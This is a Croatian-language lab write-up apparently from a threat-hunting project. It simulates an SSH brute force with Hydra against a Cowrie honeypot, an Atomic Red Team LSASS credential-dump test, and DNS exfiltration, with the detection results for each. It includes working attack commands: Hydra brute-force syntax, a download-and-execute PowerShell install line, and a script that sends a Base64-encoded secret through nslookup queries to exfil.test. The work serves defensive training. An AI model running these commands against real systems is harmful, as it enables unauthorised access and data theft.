# Napad 1: SSH Brute Force Attack na Honeypot

**MITRE ATT&CK:** T1110.001 – Password Guessing  
**Cilj:** Simulirati brute-force napad radi dobivanja početnog pristupa sustavu (Initial Access)

---

## Opis napada

U ovom scenariju simuliran je SSH brute-force napad s ciljem dobivanja početnog pristupa sustavu.  
Napad je izveden s Kali Linux virtualnog stroja, dok je meta bio Cowrie SSH honeypot koji se nalazi na SIEM (Ubuntu) poslužitelju.

Cowrie honeypot emulira ranjivi SSH servis i ne predstavlja stvarni produkcijski sustav. Njegova svrha je bilježenje napadačkog ponašanja, uključujući pokušaje prijave, korištena korisnička imena, lozinke i IP adrese napadača.



---

## Korak 1 – Ručni SSH pokušaj (validacija servisa)

Prvo je provjereno je li SSH servis aktivan na nestandardnom portu 2222.

**Naredba (Kali Linux):**
```bash
ssh root@192.168.56.102 -p 2222
```

Ovim korakom potvrđeno je da je SSH servis dostupan i spreman za daljnju simulaciju napada.


![Ručni SSH pokušaj na portu 2222](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-1/napad_1_rucni_ssh_pokusan.png)

## Korak 2 – Priprema liste lozinki

Na Kali Linux virtualnom stroju kreirana je datoteka s listom lozinki koje će se koristiti u brute-force napadu.

**Kreiranje datoteke:**
```bash
nano passwords.txt
```

Sadržaj datoteke passwords.txt:
```bash
123456
password
admin
root
toor
letmein

```
## Korak 3 – Automatizirani brute-force napad (Hydra)

Za automatizirano isprobavanje više lozinki korišten je alat Hydra.

**Naredba (Kali Linux):**

```bash
hydra -l root -P passwords.txt ssh://192.168.56.102 -s 2222
```

Hydra je pokušavala prijavu koristeći korisničko ime root i lozinke iz datoteke `passwords.txt`.
Rezultat napada bio je više uspješnih prijava, što je očekivano ponašanje za Cowrie honeypot.

![Hydra brute-force napad - uspješne prijave](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-1/napad_1hydra_brute-force_napad.png)

## Detekcija i logiranje napada
**Cowrie honeypot logovi**
Cowrie honeypot bilježi sve pokušaje prijave i sprema ih u JSON logove.
**Pregled logova (SIEM VM):**
```bash
cd ~/cowrie/var/log/cowrie
tail -f cowrie.json
```
- U logovima su vidljivi:

- uspješni SSH logini

- korištena korisnička imena i lozinke

- IP adresa napadača

- vrijeme svakog pokušaja

![Cowrie JSON logovi - zabilježeni SSH login](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-1/napad_1_Cowrie_JSON_logovi.png)







# Napad 2: Credential Access – LSASS Memory Access (Safe Simulation)

## MITRE ATT&CK
**T1003.001 – LSASS Memory**

---

## Opis napada

U ovom scenariju simuliran je pokušaj krađe korisničkih vjerodajnica iz memorije procesa **LSASS (Local Security Authority Subsystem Service)** na Windows endpoint sustavu.

LSASS proces u Windows operacijskom sustavu zadužen je za autentikaciju korisnika te privremeno pohranjuje osjetljive podatke poput hashiranih lozinki i Kerberos ticketa. Zbog toga je česta meta napadača nakon što ostvare početni pristup sustavu.

Napad je simuliran korištenjem alata **Atomic Red Team**, koji omogućuje sigurno izvođenje MITRE ATT&CK tehnika bez stvarne kompromitacije sustava. Cilj napada bio je generirati realistične sigurnosne događaje vezane uz pokušaje pristupa LSASS procesu.

---


## Koraci napada

### Korak 1 – Priprema okruženja

Na Windows Endpoint VM-u provjereno je da su aktivni:
- Wazuh agent
- Sysmon (System Monitor)

Time je osigurano prikupljanje sigurnosne telemetrije tijekom simulacije.



---

### Korak 2 – Instalacija Atomic Red Team alata

U PowerShellu (Run as Administrator) instaliran je Atomic Red Team pomoću službenog install skripta.

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
iwr https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1 -UseBasicParsing | iex
Install-AtomicRedTeam -getAtomics -Force
```
Nakon instalacije sustav je spreman za izvođenje Atomic testova.


![Uspješna instalacija Atomic Red Team alata](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-2/napad_2_instalacija_atomic_red_team.png)


## Korak 3 – Izvođenje LSASS simulacije

Pokrenut je Atomic test za tehniku **T1003.001 – LSASS Memory**, koji pokušava pristupiti memoriji LSASS procesa koristeći različite metode (ProcDump, MiniDump, API pozivi).

**Naredba (Windows endpoint):**

    Invoke-AtomicTest T1003.001

Tijekom izvođenja testa većina pokušaja bila je blokirana od strane operacijskog sustava i antivirusne zaštite, što je vidljivo kroz poruke poput:

- Access is denied
- Script blocked by antivirus

Ovo ponašanje je očekivano i potvrđuje da je simulacija izvedena sigurno, bez kompromitiranja stvarnog sustava.

![Izvođenje LSASS testa i blokirane aktivnosti](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-2/napad_2_lsass_1.png)
![Izvođenje LSASS testa i blokirane aktivnosti](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-2/napad_2_lsass_2.png)
![Izvođenje LSASS testa i blokirane aktivnosti](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-2/napad_2_lsass_3.png)

---

## Detekcija i rezultat (Detection & Logging)

Tijekom simulacije generirani su sigurnosni događaji na Windows endpointu, uključujući:

- zabilježene pokušaje pristupa LSASS procesu
- sigurnosne i antivirusne blokade zlonamjernih aktivnosti
- telemetriju relevantnu za post-exploitation fazu napada

Ovi događaji omogućuju:

- analizu post-exploitation aktivnosti
- simulaciju ponašanja napadača nakon početnog pristupa sustavu
- korištenje zapisa za daljnju analizu i **threat hunting** aktivnosti




# Napad 3: Data Exfiltration over DNS (Simulacija)

## MITRE ATT&CK
**T1048.003 – Exfiltration Over DNS**

---

## Opis napada

U ovom scenariju simulirana je eksfiltracija (krađa) podataka putem **DNS protokola**, tehnike koju napadači često koriste kako bi neprimjetno iznosili podatke iz kompromitiranog sustava i zaobišli klasične sigurnosne kontrole.

DNS promet se u većini mreža smatra legitimnim i nužnim za normalno funkcioniranje sustava, zbog čega se često ne analizira detaljno. Upravo zato DNS predstavlja pogodan kanal za skrivanje zlonamjerne komunikacije.

U ovoj simulaciji osjetljivi podatak s Windows endpointa kodiran je u **Base64 format**, fragmentiran i poslan unutar DNS upita prema napadačevom sustavu. Kali Linux u ovom scenariju ne predstavlja napadača, već služi kao **DNS listener** koji presreće i analizira DNS promet.

Cilj napada bio je:
- generirati neuobičajen DNS promet
- simulirati prikrivenu eksfiltraciju podataka
- omogućiti analizu DNS-based napadačkog ponašanja

---


## Koraci napada

### Korak 1 – Priprema osjetljivog podatka

Na Windows Endpoint VM-u kreirana je testna datoteka koja sadrži simulirani osjetljivi podatak. Datoteka se koristi isključivo u edukacijske i simulacijske svrhe.

    echo "SECRET_PASSWORD=Test123!" > C:\Users\Public\secret.txt

![Kreiranje testne datoteke s osjetljivim podatkom](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-3/napad_3_kopitanje_test_datoteke.png)

---

### Korak 2 – Kodiranje i priprema podataka

Sadržaj datoteke učitan je, kodiran u Base64 format te pripremljen za slanje putem DNS upita. Kodirani niz je podijeljen u manje fragmente kako bi svaki mogao stati u naziv DNS poddomene.

    $data = Get-Content C:\Users\Public\secret.txt
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    $encoded = [System.Convert]::ToBase64String($bytes)

![Base64 kodiranje osjetljivog podatka](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-3/napad_3_base64_encoding.png)

---

### Korak 3 – Slanje podataka putem DNS upita

Svaki fragment kodiranog podatka poslan je kao DNS upit korištenjem naredbe `nslookup`. Fragment je umetnut u naziv poddomene (npr. fragment.exfil.test).

    $encoded -split '.{30}' | ForEach-Object {
        nslookup "$_.exfil.test"
    }

Ovim postupkom simulira se eksfiltracija podataka s kompromitiranog endpointa prema napadačevom sustavu koristeći DNS kao komunikacijski kanal.

![Slanje podataka kroz DNS upite](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-3/napad_3_DNS_eksfiltracija.png)

---

### Korak 4 – Presretanje DNS prometa

Na Kali Linux VM-u pokrenut je alat `tcpdump` za praćenje DNS prometa na UDP portu 53. Tijekom napada zabilježen je velik broj DNS upita s neuobičajeno dugim nazivima domena, što predstavlja tipičan indikator DNS eksfiltracije.

    sudo tcpdump -i eth0 udp port 53 -vv

![DNS paketi s eksfiltriranim podacima vidljivi u tcpdump izlazu](https://github.com/nrastija/threat-hunting-lab/blob/main/implementation/src/attack-scenarios/napad-3/napad_3_tcpdunp.png)

---

## Detekcija i rezultat (Detection & Logging)

Tijekom simulacije uočen je sljedeći obrazac ponašanja:

- generiran neuobičajen DNS promet s dugim nazivima domena
- vidljiv velik broj DNS upita u kratkom vremenu
- simulirana eksfiltracija podataka bez korištenja standardnih protokola
- omogućena analiza mrežnih indikatora kompromitacije

Ovaj scenarij pokazuje kako napadači mogu zloupotrijebiti legitimne mrežne protokole za prikrivenu krađu podataka.


